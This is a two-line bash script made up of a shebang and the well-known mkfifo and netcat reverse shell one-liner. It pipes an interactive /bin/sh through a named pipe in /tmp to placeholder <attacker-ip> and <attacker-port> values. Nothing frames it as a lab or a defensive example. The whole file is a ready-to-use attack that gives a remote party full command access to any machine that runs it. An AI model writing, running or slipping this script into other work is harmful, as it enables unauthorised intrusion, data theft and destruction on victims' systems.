#!/bin/bash

rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> <attacker-port> >/tmp/f
